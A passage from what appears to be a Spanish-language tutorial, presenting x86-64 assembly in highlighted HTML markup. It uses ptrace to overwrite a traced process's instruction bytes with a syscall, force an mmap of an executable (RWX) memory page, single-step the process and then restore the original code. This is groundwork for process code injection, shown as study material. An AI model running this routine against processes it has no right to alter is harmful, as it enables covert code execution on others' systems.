</span><span id="__span-15-103"><a id="__codelineno-15-103" name="__codelineno-15-103" href="#__codelineno-15-103"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w">       </span><span class="c1">; RSI se usa como puntero de origen y va avanzando</span>
</span><span id="__span-15-104"><a id="__codelineno-15-104" name="__codelineno-15-104" href="#__codelineno-15-104"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w">   </span><span class="c1">; RDI se usa como puntero destino y va avanzando</span>
</span><span id="__span-15-105"><a id="__codelineno-15-105" name="__codelineno-15-105" href="#__codelineno-15-105"></a>
</span><span id="__span-15-106"><a id="__codelineno-15-106" name="__codelineno-15-106" href="#__codelineno-15-106"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rcx</span><span class="p">,</span><span class="w"> </span><span class="mi">27</span><span class="w">               </span><span class="c1">; RCX se usa como contador y se va decrementando hasta 0</span>
</span><span id="__span-15-107"><a id="__codelineno-15-107" name="__codelineno-15-107" href="#__codelineno-15-107"></a><span class="w">    </span><span class="nf">cld</span><span class="w">                       </span><span class="c1">; DF=0 (dirección de copia ascendente)</span>
</span><span id="__span-15-108"><a id="__codelineno-15-108" name="__codelineno-15-108" href="#__codelineno-15-108"></a><span class="w">    </span><span class="nf">rep</span><span class="w"> </span><span class="nv">movsq</span><span class="w">                 </span><span class="c1">; mueve RCX qwords: [RSI] -&gt; [RDI]</span>
</span><span id="__span-15-109"><a id="__codelineno-15-109" name="__codelineno-15-109" href="#__codelineno-15-109"></a>
</span><span id="__span-15-110"><a id="__codelineno-15-110" name="__codelineno-15-110" href="#__codelineno-15-110"></a><span class="w">                    </span><span class="c1">; movsq copia un qword (8 bytes) desde la dirección apuntada por RSI hacia la dirección apuntada por RDI   </span>
</span><span id="__span-15-111"><a id="__codelineno-15-111" name="__codelineno-15-111" href="#__codelineno-15-111"></a><span class="w">                    </span><span class="c1">; rep repite esa operación RCX veces</span>
</span><span id="__span-15-112"><a id="__codelineno-15-112" name="__codelineno-15-112" href="#__codelineno-15-112"></a>
</span><span id="__span-15-113"><a id="__codelineno-15-113" name="__codelineno-15-113" href="#__codelineno-15-113"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-114"><a id="__codelineno-15-114" name="__codelineno-15-114" href="#__codelineno-15-114"></a>
</span><span id="__span-15-115"><a id="__codelineno-15-115" name="__codelineno-15-115" href="#__codelineno-15-115"></a><span class="c1">; 3 Inyección de la instrucción syscall (0x0f 0x05)</span>
</span><span id="__span-15-116"><a id="__codelineno-15-116" name="__codelineno-15-116" href="#__codelineno-15-116"></a>
</span><span id="__span-15-117"><a id="__codelineno-15-117" name="__codelineno-15-117" href="#__codelineno-15-117"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x80</span><span class="p">]</span><span class="w">   </span><span class="c1">; Contenido del RIP del proceso tracee (dirección de la próxima instrucción a ejecutar)</span>
</span><span id="__span-15-118"><a id="__codelineno-15-118" name="__codelineno-15-118" href="#__codelineno-15-118"></a>
</span><span id="__span-15-119"><a id="__codelineno-15-119" name="__codelineno-15-119" href="#__codelineno-15-119"></a><span class="w">    </span><span class="c1">; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la dirección actual a la que apunta el RIP del proceso tracee</span>
</span><span id="__span-15-120"><a id="__codelineno-15-120" name="__codelineno-15-120" href="#__codelineno-15-120"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-121"><a id="__codelineno-15-121" name="__codelineno-15-121" href="#__codelineno-15-121"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w">       </span><span class="c1">; PTRACE_PEEKDATA</span>
</span><span id="__span-15-122"><a id="__codelineno-15-122" name="__codelineno-15-122" href="#__codelineno-15-122"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">     </span><span class="c1">; PID</span>
</span><span id="__span-15-123"><a id="__codelineno-15-123" name="__codelineno-15-123" href="#__codelineno-15-123"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">     </span><span class="c1">; addr</span>
</span><span id="__span-15-124"><a id="__codelineno-15-124" name="__codelineno-15-124" href="#__codelineno-15-124"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">       </span><span class="c1">; 8 bytes</span>
</span><span id="__span-15-125"><a id="__codelineno-15-125" name="__codelineno-15-125" href="#__codelineno-15-125"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">     </span><span class="c1">; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-15-126"><a id="__codelineno-15-126" name="__codelineno-15-126" href="#__codelineno-15-126"></a><span class="w">    </span><span class="nf">syscall</span><span class="w"> </span>
</span><span id="__span-15-127"><a id="__codelineno-15-127" name="__codelineno-15-127" href="#__codelineno-15-127"></a>
</span><span id="__span-15-128"><a id="__codelineno-15-128" name="__codelineno-15-128" href="#__codelineno-15-128"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsp</span><span class="p">]</span><span class="w"> </span><span class="c1">; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee</span>
</span><span id="__span-15-129"><a id="__codelineno-15-129" name="__codelineno-15-129" href="#__codelineno-15-129"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w"> </span><span class="c1">; Backup del valor original</span>
</span><span id="__span-15-130"><a id="__codelineno-15-130" name="__codelineno-15-130" href="#__codelineno-15-130"></a><span class="w">    </span><span class="nf">and</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFFFFFFFFFFFF0000</span><span class="w"> </span><span class="c1">; limpiar los 2 bytes bajos</span>
</span><span id="__span-15-131"><a id="__codelineno-15-131" name="__codelineno-15-131" href="#__codelineno-15-131"></a><span class="w">    </span><span class="nf">or</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x000000000000050F</span><span class="w">  </span><span class="c1">; insertar syscall (0x0f 0x05 en little-endian)</span>
</span><span id="__span-15-132"><a id="__codelineno-15-132" name="__codelineno-15-132" href="#__codelineno-15-132"></a>
</span><span id="__span-15-133"><a id="__codelineno-15-133" name="__codelineno-15-133" href="#__codelineno-15-133"></a><span class="w">    </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-15-134"><a id="__codelineno-15-134" name="__codelineno-15-134" href="#__codelineno-15-134"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-135"><a id="__codelineno-15-135" name="__codelineno-15-135" href="#__codelineno-15-135"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-15-136"><a id="__codelineno-15-136" name="__codelineno-15-136" href="#__codelineno-15-136"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-15-137"><a id="__codelineno-15-137" name="__codelineno-15-137" href="#__codelineno-15-137"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-15-138"><a id="__codelineno-15-138" name="__codelineno-15-138" href="#__codelineno-15-138"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-15-139"><a id="__codelineno-15-139" name="__codelineno-15-139" href="#__codelineno-15-139"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-15-140"><a id="__codelineno-15-140" name="__codelineno-15-140" href="#__codelineno-15-140"></a>
</span><span id="__span-15-141"><a id="__codelineno-15-141" name="__codelineno-15-141" href="#__codelineno-15-141"></a><span class="c1">;Valor en registro/hex: 0x00007ffe6f9001b0</span>
</span><span id="__span-15-142"><a id="__codelineno-15-142" name="__codelineno-15-142" href="#__codelineno-15-142"></a>
</span><span id="__span-15-143"><a id="__codelineno-15-143" name="__codelineno-15-143" href="#__codelineno-15-143"></a><span class="c1">;Descomposición:</span>
</span><span id="__span-15-144"><a id="__codelineno-15-144" name="__codelineno-15-144" href="#__codelineno-15-144"></a><span class="c1">;  0x 00 00 7f fe 6f 90 01 b0</span>
</span><span id="__span-15-145"><a id="__codelineno-15-145" name="__codelineno-15-145" href="#__codelineno-15-145"></a><span class="c1">;     ▲                    ▲</span>
</span><span id="__span-15-146"><a id="__codelineno-15-146" name="__codelineno-15-146" href="#__codelineno-15-146"></a><span class="c1">;     │                    │</span>
</span><span id="__span-15-147"><a id="__codelineno-15-147" name="__codelineno-15-147" href="#__codelineno-15-147"></a><span class="c1">;    MSB                 LSB</span>
</span><span id="__span-15-148"><a id="__codelineno-15-148" name="__codelineno-15-148" href="#__codelineno-15-148"></a><span class="c1">;   (más significativo) (menos significativo)</span>
</span><span id="__span-15-149"><a id="__codelineno-15-149" name="__codelineno-15-149" href="#__codelineno-15-149"></a>
</span><span id="__span-15-150"><a id="__codelineno-15-150" name="__codelineno-15-150" href="#__codelineno-15-150"></a><span class="c1">;En memoria (little-endian, LSB primero):</span>
</span><span id="__span-15-151"><a id="__codelineno-15-151" name="__codelineno-15-151" href="#__codelineno-15-151"></a>
</span><span id="__span-15-152"><a id="__codelineno-15-152" name="__codelineno-15-152" href="#__codelineno-15-152"></a><span class="c1">;RIP → 0x7f7a85496687:  ┌────┐</span>
</span><span id="__span-15-153"><a id="__codelineno-15-153" name="__codelineno-15-153" href="#__codelineno-15-153"></a><span class="c1">;                       │ b0 │ ← Primer byte, primera instrucción</span>
</span><span id="__span-15-154"><a id="__codelineno-15-154" name="__codelineno-15-154" href="#__codelineno-15-154"></a><span class="c1">;      0x7f7a85496688:  ├────┤</span>
</span><span id="__span-15-155"><a id="__codelineno-15-155" name="__codelineno-15-155" href="#__codelineno-15-155"></a><span class="c1">;                       │ 01 │</span>
</span><span id="__span-15-156"><a id="__codelineno-15-156" name="__codelineno-15-156" href="#__codelineno-15-156"></a><span class="c1">;      0x7f7a85496689:  ├────┤</span>
</span><span id="__span-15-157"><a id="__codelineno-15-157" name="__codelineno-15-157" href="#__codelineno-15-157"></a><span class="c1">;                       │ 90 │</span>
</span><span id="__span-15-158"><a id="__codelineno-15-158" name="__codelineno-15-158" href="#__codelineno-15-158"></a><span class="c1">;      0x7f7a8549668a:  ├────┤</span>
</span><span id="__span-15-159"><a id="__codelineno-15-159" name="__codelineno-15-159" href="#__codelineno-15-159"></a><span class="c1">;                       │ 6f │</span>
</span><span id="__span-15-160"><a id="__codelineno-15-160" name="__codelineno-15-160" href="#__codelineno-15-160"></a><span class="c1">;      0x7f7a8549668b:  ├────┤</span>
</span><span id="__span-15-161"><a id="__codelineno-15-161" name="__codelineno-15-161" href="#__codelineno-15-161"></a><span class="c1">;                       │ fe │</span>
</span><span id="__span-15-162"><a id="__codelineno-15-162" name="__codelineno-15-162" href="#__codelineno-15-162"></a><span class="c1">;      0x7f7a8549668c:  ├────┤</span>
</span><span id="__span-15-163"><a id="__codelineno-15-163" name="__codelineno-15-163" href="#__codelineno-15-163"></a><span class="c1">;                       │ 7f │</span>
</span><span id="__span-15-164"><a id="__codelineno-15-164" name="__codelineno-15-164" href="#__codelineno-15-164"></a><span class="c1">;      0x7f7a8549668d:  ├────┤</span>
</span><span id="__span-15-165"><a id="__codelineno-15-165" name="__codelineno-15-165" href="#__codelineno-15-165"></a><span class="c1">;                       │ 00 │</span>
</span><span id="__span-15-166"><a id="__codelineno-15-166" name="__codelineno-15-166" href="#__codelineno-15-166"></a><span class="c1">;      0x7f7a8549668e:  ├────┤</span>
</span><span id="__span-15-167"><a id="__codelineno-15-167" name="__codelineno-15-167" href="#__codelineno-15-167"></a><span class="c1">;                       │ 00 │</span>
</span><span id="__span-15-168"><a id="__codelineno-15-168" name="__codelineno-15-168" href="#__codelineno-15-168"></a><span class="c1">;                       └────┘</span>
</span><span id="__span-15-169"><a id="__codelineno-15-169" name="__codelineno-15-169" href="#__codelineno-15-169"></a>
</span><span id="__span-15-170"><a id="__codelineno-15-170" name="__codelineno-15-170" href="#__codelineno-15-170"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-171"><a id="__codelineno-15-171" name="__codelineno-15-171" href="#__codelineno-15-171"></a>
</span><span id="__span-15-172"><a id="__codelineno-15-172" name="__codelineno-15-172" href="#__codelineno-15-172"></a><span class="c1">; 4 Configuración de registros para MMAP</span>
</span><span id="__span-15-173"><a id="__codelineno-15-173" name="__codelineno-15-173" href="#__codelineno-15-173"></a>
</span><span id="__span-15-174"><a id="__codelineno-15-174" name="__codelineno-15-174" href="#__codelineno-15-174"></a><span class="w">    </span><span class="c1">; MMAP</span>
</span><span id="__span-15-175"><a id="__codelineno-15-175" name="__codelineno-15-175" href="#__codelineno-15-175"></a>
</span><span id="__span-15-176"><a id="__codelineno-15-176" name="__codelineno-15-176" href="#__codelineno-15-176"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x50</span><span class="p">],</span><span class="w"> </span><span class="mi">9</span><span class="w">       </span><span class="c1">; (RAX) Se sustituye todo el valor del registro       Número de syscall para mmap</span>
</span><span id="__span-15-177"><a id="__codelineno-15-177" name="__codelineno-15-177" href="#__codelineno-15-177"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x70</span><span class="p">],</span><span class="mi">0</span><span class="w">        </span><span class="c1">; (RDI)       rdi = addr = 0 (NULL) → Pide al kernel que elija la dirección</span>
</span><span id="__span-15-178"><a id="__codelineno-15-178" name="__codelineno-15-178" href="#__codelineno-15-178"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x68</span><span class="p">],</span><span class="mi">4096</span><span class="w">     </span><span class="c1">; (RSI)       rsi = length = 4096 bytes (1 página típica)</span>
</span><span id="__span-15-179"><a id="__codelineno-15-179" name="__codelineno-15-179" href="#__codelineno-15-179"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x60</span><span class="p">],</span><span class="mi">7</span><span class="w">        </span><span class="c1">; (RDX)       rdx = prot = 7 =&gt; PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)</span>
</span><span id="__span-15-180"><a id="__codelineno-15-180" name="__codelineno-15-180" href="#__codelineno-15-180"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x38</span><span class="p">],</span><span class="mi">34</span><span class="w">       </span><span class="c1">; (R10)       r10 = flags = 34 =&gt; MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)</span>
</span><span id="__span-15-181"><a id="__codelineno-15-181" name="__codelineno-15-181" href="#__codelineno-15-181"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x48</span><span class="p">],</span><span class="o">-</span><span class="mi">1</span><span class="w">       </span><span class="c1">; (R8)        r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica &quot;no file&quot;)</span>
</span><span id="__span-15-182"><a id="__codelineno-15-182" name="__codelineno-15-182" href="#__codelineno-15-182"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x40</span><span class="p">],</span><span class="mi">0</span><span class="w">        </span><span class="c1">; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)</span>
</span><span id="__span-15-183"><a id="__codelineno-15-183" name="__codelineno-15-183" href="#__codelineno-15-183"></a>
</span><span id="__span-15-184"><a id="__codelineno-15-184" name="__codelineno-15-184" href="#__codelineno-15-184"></a><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-15-185"><a id="__codelineno-15-185" name="__codelineno-15-185" href="#__codelineno-15-185"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-186"><a id="__codelineno-15-186" name="__codelineno-15-186" href="#__codelineno-15-186"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-15-187"><a id="__codelineno-15-187" name="__codelineno-15-187" href="#__codelineno-15-187"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-15-188"><a id="__codelineno-15-188" name="__codelineno-15-188" href="#__codelineno-15-188"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-15-189"><a id="__codelineno-15-189" name="__codelineno-15-189" href="#__codelineno-15-189"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-15-190"><a id="__codelineno-15-190" name="__codelineno-15-190" href="#__codelineno-15-190"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-15-191"><a id="__codelineno-15-191" name="__codelineno-15-191" href="#__codelineno-15-191"></a>
</span><span id="__span-15-192"><a id="__codelineno-15-192" name="__codelineno-15-192" href="#__codelineno-15-192"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-193"><a id="__codelineno-15-193" name="__codelineno-15-193" href="#__codelineno-15-193"></a>
</span><span id="__span-15-194"><a id="__codelineno-15-194" name="__codelineno-15-194" href="#__codelineno-15-194"></a><span class="c1">; 5 Ejecución controlada de la syscall MMAP</span>
</span><span id="__span-15-195"><a id="__codelineno-15-195" name="__codelineno-15-195" href="#__codelineno-15-195"></a>
</span><span id="__span-15-196"><a id="__codelineno-15-196" name="__codelineno-15-196" href="#__codelineno-15-196"></a><span class="w">    </span><span class="c1">;PTRACE_SINGLESTEP</span>
</span><span id="__span-15-197"><a id="__codelineno-15-197" name="__codelineno-15-197" href="#__codelineno-15-197"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-198"><a id="__codelineno-15-198" name="__codelineno-15-198" href="#__codelineno-15-198"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="w">       </span><span class="c1">; PTRACE_SINGLESTEP</span>
</span><span id="__span-15-199"><a id="__codelineno-15-199" name="__codelineno-15-199" href="#__codelineno-15-199"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">     </span><span class="c1">; PID</span>
</span><span id="__span-15-200"><a id="__codelineno-15-200" name="__codelineno-15-200" href="#__codelineno-15-200"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">     </span><span class="c1">; addr</span>
</span><span id="__span-15-201"><a id="__codelineno-15-201" name="__codelineno-15-201" href="#__codelineno-15-201"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">     </span><span class="c1">; data</span>
</span><span id="__span-15-202"><a id="__codelineno-15-202" name="__codelineno-15-202" href="#__codelineno-15-202"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-15-203"><a id="__codelineno-15-203" name="__codelineno-15-203" href="#__codelineno-15-203"></a>
</span><span id="__span-15-204"><a id="__codelineno-15-204" name="__codelineno-15-204" href="#__codelineno-15-204"></a><span class="w">    </span><span class="c1">; WAIT4: </span>
</span><span id="__span-15-205"><a id="__codelineno-15-205" name="__codelineno-15-205" href="#__codelineno-15-205"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">61</span>
</span><span id="__span-15-206"><a id="__codelineno-15-206" name="__codelineno-15-206" href="#__codelineno-15-206"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">            </span><span class="c1">; PID a esperar (-1 para cualquier hijo)</span>
</span><span id="__span-15-207"><a id="__codelineno-15-207" name="__codelineno-15-207" href="#__codelineno-15-207"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-15-208"><a id="__codelineno-15-208" name="__codelineno-15-208" href="#__codelineno-15-208"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">            </span><span class="c1">; &amp;status</span>
</span><span id="__span-15-209"><a id="__codelineno-15-209" name="__codelineno-15-209" href="#__codelineno-15-209"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">            </span><span class="c1">; options</span>
</span><span id="__span-15-210"><a id="__codelineno-15-210" name="__codelineno-15-210" href="#__codelineno-15-210"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">            </span><span class="c1">; rusage</span>
</span><span id="__span-15-211"><a id="__codelineno-15-211" name="__codelineno-15-211" href="#__codelineno-15-211"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-15-212"><a id="__codelineno-15-212" name="__codelineno-15-212" href="#__codelineno-15-212"></a>
</span><span id="__span-15-213"><a id="__codelineno-15-213" name="__codelineno-15-213" href="#__codelineno-15-213"></a><span class="w">    </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-15-214"><a id="__codelineno-15-214" name="__codelineno-15-214" href="#__codelineno-15-214"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-215"><a id="__codelineno-15-215" name="__codelineno-15-215" href="#__codelineno-15-215"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">   </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-15-216"><a id="__codelineno-15-216" name="__codelineno-15-216" href="#__codelineno-15-216"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">  </span><span class="c1">; PID</span>
</span><span id="__span-15-217"><a id="__codelineno-15-217" name="__codelineno-15-217" href="#__codelineno-15-217"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">  </span><span class="c1">; addr</span>
</span><span id="__span-15-218"><a id="__codelineno-15-218" name="__codelineno-15-218" href="#__codelineno-15-218"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_sys</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se va almacenar la estructura de registros</span>
</span><span id="__span-15-219"><a id="__codelineno-15-219" name="__codelineno-15-219" href="#__codelineno-15-219"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-15-220"><a id="__codelineno-15-220" name="__codelineno-15-220" href="#__codelineno-15-220"></a>
</span><span id="__span-15-221"><a id="__codelineno-15-221" name="__codelineno-15-221" href="#__codelineno-15-221"></a>
</span><span id="__span-15-222"><a id="__codelineno-15-222" name="__codelineno-15-222" href="#__codelineno-15-222"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-223"><a id="__codelineno-15-223" name="__codelineno-15-223" href="#__codelineno-15-223"></a>
</span><span id="__span-15-224"><a id="__codelineno-15-224" name="__codelineno-15-224" href="#__codelineno-15-224"></a><span class="c1">; 6 Obtención del resultado de la syscall MMAP</span>
</span><span id="__span-15-225"><a id="__codelineno-15-225" name="__codelineno-15-225" href="#__codelineno-15-225"></a>
</span><span id="__span-15-226"><a id="__codelineno-15-226" name="__codelineno-15-226" href="#__codelineno-15-226"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w"> </span>
</span><span id="__span-15-227"><a id="__codelineno-15-227" name="__codelineno-15-227" href="#__codelineno-15-227"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_sys</span><span class="o">+</span><span class="mh">0x50</span><span class="p">]</span><span class="w">       </span><span class="c1">; (RAX) dirección donde comienza la zona de memoria reservada com permisos RWX</span>
</span><span id="__span-15-228"><a id="__codelineno-15-228" name="__codelineno-15-228" href="#__codelineno-15-228"></a>
</span><span id="__span-15-229"><a id="__codelineno-15-229" name="__codelineno-15-229" href="#__codelineno-15-229"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-230"><a id="__codelineno-15-230" name="__codelineno-15-230" href="#__codelineno-15-230"></a>
</span><span id="__span-15-231"><a id="__codelineno-15-231" name="__codelineno-15-231" href="#__codelineno-15-231"></a><span class="c1">; 7 Restauración del contenido ubicado en la dirección a la que apunta el registro RIP del tracee</span>
</span><span id="__span-15-232"><a id="__codelineno-15-232" name="__codelineno-15-232" href="#__codelineno-15-232"></a>
</span><span id="__span-15-233"><a id="__codelineno-15-233" name="__codelineno-15-233" href="#__codelineno-15-233"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-15-234"><a id="__codelineno-15-234" name="__codelineno-15-234" href="#__codelineno-15-234"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x80</span><span class="p">]</span>
</span><span id="__span-15-235"><a id="__codelineno-15-235" name="__codelineno-15-235" href="#__codelineno-15-235"></a>
</span><span id="__span-15-236"><a id="__codelineno-15-236" name="__codelineno-15-236" href="#__codelineno-15-236"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-15-237"><a id="__codelineno-15-237" name="__codelineno-15-237" href="#__codelineno-15-237"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-238"><a id="__codelineno-15-238" name="__codelineno-15-238" href="#__codelineno-15-238"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
